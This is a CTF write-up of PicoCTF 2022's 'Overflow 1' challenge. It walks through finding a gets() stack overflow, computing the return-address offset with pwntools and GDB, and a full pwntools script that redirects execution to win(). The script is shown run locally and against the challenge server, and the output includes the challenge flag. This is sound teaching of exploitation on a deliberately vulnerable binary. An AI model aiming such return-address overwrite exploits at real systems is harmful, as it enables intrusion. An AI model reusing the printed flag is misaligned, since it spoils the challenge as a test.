Title:  PicoCTF 2022:  Overflow 1
Date: 2022-04-06 19:00
Category: PicoCTF
tags: CTF, picoCTF, write-up, binexp
summary: >
	Write up of the Overflow-1 Challenge
	

# Overflow 1 

Overflow 1 was a 200 point  Binexp box from PicoCTF 2022

> Control the Return Address


# Looking at the program

## Checksec flags
First lets see what checksec says about the file.

```
(env) dang@danglaptop ~/Github/Pico2022/BinExp/Overflow1$ checksec vuln           ✚ ✭main 
[*] '/home/dang/Github/Pico2022/BinExp/Overflow1/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

We have a 32 bit binary,  without any protections enabled, "easymode" is certainly turned on here.

## Looking at the program

Looking at the supplied source code, we see the flow of the challenge.


The ```vuln()``` function, has a call to ```gets``` that is going to let us overflow  32 bit buffer.
```
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```
  
  
There is a second ```win()``` function that is going to give us the flag. 

# POC

Our Initial proof of concept becomes something like this

  - Overflow the buffer to control IP
  - Stick the address of the Win function in IP
  - ....
  - Profit
  

We will use the wonderful [pwntools](https://docs.pwntools.com/en/stable/) to get our POC working

## Working out IP

Let write a script that uses pwntools an cyclic to get the offset to IP

```
from pwn import *

#Start a Process
p = process("./vuln")

#Read the initial data
data = p.readline()
log.debug("Data is %s", data)

# Code for Offset
pause()  #Let me attach GDB
p.sendline(cyclic(50))

# Let things break
p.interactive()
```

Running our program, and attaching GDB to the process (I still cant get my tiling WM, GDB and Pwn to play together nicely) we see that the offset is at **44** bytes.

Catch the contents of cyclic in GDB
```
────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x6161616c
────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "vuln", stopped 0x6161616c in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Lookup the offset

```
(env) dang@danglaptop ~/Github/Pico2022/BinExp/Overflow1$ cyclic -l 0x6161616c 
44
```

## Address to Jump to

We also need the address of the ```win()``` function.

As the program is compiled without PIE, this wont change, making it super easy to find.  Given the program is nice and simple, I just use objdump, rahter than firing up R2. Locating the entrypoint at ```0x80491f6```

```
objdump -D vuln

....

080491f6 <win>:
 80491f6:       f3 0f 1e fb             endbr32 
 80491fa:       55                      push   %ebp
 80491fb:       89 e5                   mov    %esp,%ebp
```



# Exploit Code

Lets stick the values we have into some exploit code.

```
from pwn import *

# Start the Process
p = process("./vuln")  #Local
#p = remote("saturn.picoctf.net", 50823) #Remote

OFFSET = 44
ADDR = 0x080491f6

log.info("---- Start Exploit ----")

#Read input

data = p.readline()
log.info("Data is %s", data)


# Build and send the Payload

payload = b"A"*OFFSET
payload += p32(ADDR)
p.sendline(payload)

data = p.read() #
log.info("Flag is %s", data)
```


When we run this we get the following.  The text with "flag.txt" is in our win function so we know we are OK

```
(env) dang@danglaptop ~/Github/Pico2022/BinExp/Overflow1$ python exploit.py     ✹ ✚ ✭main 
[+] Starting local process './vuln': pid 278648
[*] ---- Start Exploit ----
[*] Data is b'Please enter your string: \n'
[*] Flag is b"Okay, time to return... Fingers Crossed... Jumping to 0x80491f6\nPlease create 'flag.txt' in this directory with your own debugging flag.\n"
[*] Process './vuln' stopped with exit code 0 (pid 278648)
```


## Running on the Remote

To modify our progarm to run on the remote we just need to change
how the process is created, using the built in ```rempte``` function to connect.

```
#p = process("./vuln")  #Local
p = remote("saturn.picoctf.net", 50823) #Remote
```

Which gives us (newlines added by me)

```
(env) dang@danglaptop ~/Github/Pico2022/Overflow1$ python exploit.py                     
[+] Opening connection to saturn.picoctf.net on port 50823: Done
[*] ---- Start Exploit ----
[*] Data is b'Please enter your string: \n'
[*] Flag is b"Okay, time to return... Fingers Crossed... Jumping to 0x80491f6
picoCTF{addr3ss3s_ar3_3asy_c76b273b}"
```
  
